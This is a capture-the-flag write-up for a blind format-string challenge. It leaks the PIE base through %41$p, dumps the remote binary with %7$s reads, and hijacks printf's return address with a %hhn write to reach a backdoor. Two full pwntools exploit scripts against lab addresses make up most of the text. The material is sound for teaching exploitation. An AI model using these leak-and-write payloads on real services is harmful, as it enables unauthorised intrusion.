## nofile (Blind FMT Pwn)

This challenge is a **Blind Format String pwn**, which is a form of black-box exploitation. Without a binary attachment, the standard initial approach is to test for format string vulnerabilities using `%p` or testing for stack overflows with long payloads.

### Stage 1: Leaking PIE and Dumping the Binary

Initial testing with `%p` reveals that **PIE (Position Independent Executable)** is enabled. To proceed, we must leak a stack address to derive the program's base address. Specifically, we look for a "pointer pair" on the stack—where a stack frame pointer (RBP) is immediately followed by a return address. By capturing the return address and masking/subtracting the known offset (typically the last three nibbles), we can determine the PIE base.

In this case, the return address is found at **offset 41**. By subtracting `0x1296` from this address, we calculate the PIE base. We then use a loop to leak memory byte-by-byte and dump the remote binary to a local file.

**Dump Script:**

```python
from pwn import *

# r=process('./pwn')
r=remote("192.168.157.1",16797)
context.log_level='debug'
r.recvuntil("> ")

r.send(b'%41$p')
addr=int(r.recv(14).decode(),16)
print(hex(addr))
begin=addr-0x1296

bin=b''

def leak(addr):
    # 'dump' is used to pad the payload to 8-byte alignment
    payload=b'%7$sdump'+p64(addr)
    r.sendafter(b'> ',payload)
    data=r.recvuntil(b'dump',drop=True)
    return data

try:
    while True:
        data=leak(begin)
        begin+=len(data)
        bin+=data
        if len(data)==0:
            begin+=1
            bin+=b'\x00' 
            
except:
    log.success("finish")
finally:
    log.success(len(bin))
    with open('dump_binary','wb') as f:
        f.write(bin)
        
r.interactive()
```

### Stage 2: Exploitation

After analyzing the dumped binary, we find an **infinite loop** allowing multiple format string triggers, along with a **backdoor function**. Potential attack vectors include hijacking the **GOT (Global Offset Table)** or hijacking the **return address** of `printf` on the stack.

Below is an example of hijacking the `printf` return address on the stack:

1. Leak the stack address.
2. Calculate the exact stack location of the return address.
3. Overwrite the return address with the backdoor address.

**Note:** To maintain **stack alignment**, the payload uses `%162c` (0xa2) to jump over a `push` instruction.

**Exploit Script:**

```python
from pwn import *

# r=process('./pwn')
r=remote("127.0.0.1",10002)
context.log_level='debug'
r.recvuntil("> ")

# Stage 1: Re-leak PIE base via offset 41
r.send(b'%41$p')
addr=int(r.recv(14).decode(),16)
print(hex(addr))
begin=addr-0x1296

# Stage 2: Leak stack address via offset 40
r.recvuntil("> ")
r.send(b'%40$p')
stack=int(r.recv(14).decode(),16)
print(hex(stack))

# Stage 3: Hijack return address
# Use %hhn to write one byte (0xa2) to the return address location
r.recvuntil("> ")
payload=b'%162c%8$hhn'
payload=payload.ljust(16,b'\x00')
payload+=p64(stack-0x128) # Target address on stack
r.send(payload)

r.interactive()
```